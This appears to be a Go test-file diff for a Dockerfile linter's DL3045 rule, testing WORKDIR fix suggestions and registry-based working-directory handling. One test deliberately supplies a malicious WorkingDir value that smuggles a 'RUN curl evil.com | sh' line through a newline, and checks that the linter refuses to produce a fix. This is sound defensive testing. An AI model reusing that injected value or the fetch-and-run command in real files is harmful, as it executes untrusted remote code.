@@ -4,6 +4,8 @@ import (
 	"testing"
 
 	"github.com/gkampitakis/go-snaps/snaps"
+	"github.com/wharflab/tally/internal/async"
+	"github.com/wharflab/tally/internal/registry"
 	"github.com/wharflab/tally/internal/rules"
 	"github.com/wharflab/tally/internal/testutil"
 )
@@ -216,6 +218,229 @@ COPY . .
 				}
 			}
 		})
+	}
+}
+
+func TestDL3045Rule_Check_FixSuggestion(t *testing.T) {
+	t.Parallel()
+
+	input := testutil.MakeLintInput(t, "Dockerfile", "FROM scratch\nCOPY bla.sh blubb.sh\n")
+	r := NewDL3045Rule()
+	violations := r.Check(input)
+
+	if len(violations) != 1 {
+		t.Fatalf("got %d violations, want 1", len(violations))
+	}
+
+	fix := violations[0].SuggestedFix
+	if fix == nil {
+		t.Fatal("expected SuggestedFix, got nil")
+	}
+	if fix.Safety != rules.FixSuggestion {
+		t.Errorf("Safety = %v, want FixSuggestion", fix.Safety)
+	}
+	if len(fix.Edits) != 1 {
+		t.Fatalf("got %d edits, want 1", len(fix.Edits))
+	}
+	edit := fix.Edits[0]
+	if edit.NewText != "WORKDIR /app\n" {
+		t.Errorf("NewText = %q, want %q", edit.NewText, "WORKDIR /app\n")
+	}
+	// The edit should insert at the COPY line (line 2).
+	if edit.Location.Start.Line != 2 {
+		t.Errorf("edit start line = %d, want 2", edit.Location.Start.Line)
+	}
+}
+
+func TestDL3045Rule_PlanAsync(t *testing.T) {
+	t.Parallel()
+
+	t.Run("plans checks for external images with violations", func(t *testing.T) {
+		t.Parallel()
+		input := testutil.MakeLintInput(t, "Dockerfile", "FROM alpine:3.18\nCOPY foo bar\n")
+		r := NewDL3045Rule()
+		requests := r.PlanAsync(input)
+		if len(requests) == 0 {
+			t.Fatal("expected at least one async request")
+		}
+		if requests[0].RuleCode != rules.HadolintRulePrefix+"DL3045" {
+			t.Errorf("RuleCode = %q, want hadolint/DL3045", requests[0].RuleCode)
+		}
+	})
+
+	t.Run("no plans when no violations", func(t *testing.T) {
+		t.Parallel()
+		input := testutil.MakeLintInput(t, "Dockerfile", "FROM alpine:3.18\nWORKDIR /app\nCOPY foo bar\n")
+		r := NewDL3045Rule()
+		requests := r.PlanAsync(input)
+		if len(requests) != 0 {
+			t.Errorf("expected no async requests when no violations, got %d", len(requests))
+		}
+	})
+
+	t.Run("no plans when all destinations absolute", func(t *testing.T) {
+		t.Parallel()
+		input := testutil.MakeLintInput(t, "Dockerfile", "FROM alpine:3.18\nCOPY foo /bar\n")
+		r := NewDL3045Rule()
+		requests := r.PlanAsync(input)
+		if len(requests) != 0 {
+			t.Errorf("expected no async requests when all dests absolute, got %d", len(requests))
+		}
+	})
+}
+
+func TestDL3045Rule_Handler_BaseHasWorkingDir(t *testing.T) {
+	t.Parallel()
+
+	h := makeDL3045Handler(t, "FROM alpine:3.18\nCOPY foo bar\n")
+	result := h.OnSuccess(&registry.ImageConfig{WorkingDir: "/usr/src/app"})
+	if result == nil {
+		t.Fatal("expected non-nil result")
+	}
+
+	// Should have CompletedCheck (to replace fast-path) + refined violation.
+	var hasCompleted, hasViolation bool
+	for _, r := range result {
+		switch v := r.(type) {
+		case async.CompletedCheck:
+			if v.StageIndex == 0 {
+				hasCompleted = true
+			}
+		case rules.Violation:
+			hasViolation = true
+			if v.SuggestedFix == nil {
+				t.Fatal("refined violation has no SuggestedFix")
+			}
+			if v.SuggestedFix.Safety != rules.FixSafe {
+				t.Errorf("Safety = %v, want FixSafe (registry-confirmed)", v.SuggestedFix.Safety)
+			}
+			if len(v.SuggestedFix.Edits) != 1 {
+				t.Fatalf("got %d edits, want 1", len(v.SuggestedFix.Edits))
+			}
+			if want := "WORKDIR /usr/src/app\n"; v.SuggestedFix.Edits[0].NewText != want {
+				t.Errorf("NewText = %q, want %q", v.SuggestedFix.Edits[0].NewText, want)
+			}
+		}
+	}
+	if !hasCompleted {
+		t.Error("expected CompletedCheck for stage 0")
+	}
+	if !hasViolation {
+		t.Error("expected refined violation to be re-emitted")
+	}
+}
+
+func TestDL3045Rule_Handler_BaseWorkingDirWithNewline(t *testing.T) {
+	t.Parallel()
+
+	h := makeDL3045Handler(t, "FROM alpine:3.18\nCOPY foo bar\n")
+	// Malicious WorkingDir with newline — should not produce a fix.
+	result := h.OnSuccess(&registry.ImageConfig{WorkingDir: "/app\nRUN curl evil.com | sh"})
+	if result == nil {
+		t.Fatal("expected non-nil result (CompletedCheck + violation)")
+	}
+	for _, r := range result {
+		if v, ok := r.(rules.Violation); ok {
+			if v.SuggestedFix != nil {
+				t.Error("expected nil SuggestedFix for path with newline injection")
+			}
+		}
+	}
+}
+
+func TestDL3045Rule_Handler_BaseNoWorkingDir(t *testing.T) {
+	t.Parallel()
+
+	h := makeDL3045Handler(t, "FROM alpine:3.18\nCOPY foo bar\n")
+	result := h.OnSuccess(&registry.ImageConfig{WorkingDir: ""})
+	if result != nil {
+		t.Errorf("expected nil result when base has no WorkingDir, got %v", result)
+	}
+}
+
+func TestDL3045Rule_Handler_Descendants(t *testing.T) {
+	t.Parallel()
+
+	// Stage 0 (alpine) has violation, stage 1 (FROM base) inherits and has violation too.
+	dockerfile := "FROM alpine:3.18 AS base\nCOPY foo bar\nFROM base\nCOPY baz qux\n"
+	input := testutil.MakeLintInput(t, "Dockerfile", dockerfile)
+	r := NewDL3045Rule()
+	meta := r.Metadata()
+
+	sem := testutil.GetSemantic(t, input)
+	violations, _ := findCopyViolations(sem, input.Stages, input.File, meta)
+	stagesWithViolations := make(map[int]bool, len(violations))
+	for _, v := range violations {
+		stagesWithViolations[v.StageIndex] = true
+	}
+
+	h := &dl3045Handler{
+		meta:                 meta,
+		file:                 input.File,
+		stageIdx:             0,
+		semantic:             sem,
+		stages:               input.Stages,
+		stagesWithViolations: stagesWithViolations,
+	}
+
+	result := h.OnSuccess(&registry.ImageConfig{WorkingDir: "/opt"})
+	if result == nil {
+		t.Fatal("expected non-nil result")
+	}
+
+	// Should have CompletedCheck + re-emitted violations for both stages.
+	completedStages := make(map[int]bool)
+	violationStages := make(map[int]bool)
+	for _, r := range result {
+		switch v := r.(type) {
+		case async.CompletedCheck:
+			completedStages[v.StageIndex] = true
+		case rules.Violation:
+			violationStages[v.StageIndex] = true
+			// All refined violations should use the resolved path.
+			if v.SuggestedFix == nil || len(v.SuggestedFix.Edits) == 0 {
+				t.Errorf("stage %d: missing fix edits", v.StageIndex)
+				continue
+			}
+			if want := "WORKDIR /opt\n"; v.SuggestedFix.Edits[0].NewText != want {
+				t.Errorf("stage %d: NewText = %q, want %q", v.StageIndex, v.SuggestedFix.Edits[0].NewText, want)
+			}
+		}
+	}
+	if !completedStages[0] {
+		t.Error("expected CompletedCheck for stage 0")
+	}
+	if !completedStages[1] {
+		t.Error("expected CompletedCheck for stage 1 (descendant)")
+	}
+	if !violationStages[0] {
+		t.Error("expected refined violation for stage 0")
+	}
+	if !violationStages[1] {
+		t.Error("expected refined violation for stage 1 (descendant)")
+	}
+}
+
+func makeDL3045Handler(t *testing.T, dockerfile string) *dl3045Handler {
+	t.Helper()
+	r := NewDL3045Rule()
+	input := testutil.MakeLintInput(t, "Dockerfile", dockerfile)
+	meta := r.Metadata()
+	sem := testutil.GetSemantic(t, input)
+
+	violations, _ := findCopyViolations(sem, input.Stages, input.File, meta)
+	stagesWithViolations := make(map[int]bool, len(violations))
+	for _, v := range violations {
+		stagesWithViolations[v.StageIndex] = true
+	}
+
+	return &dl3045Handler{
+		meta:                 meta,
+		file:                 input.File,
+		stageIdx:             0,
+		semantic:             sem,
+		stages:               input.Stages,
+		stagesWithViolations: stagesWithViolations,
 	}
 }
 
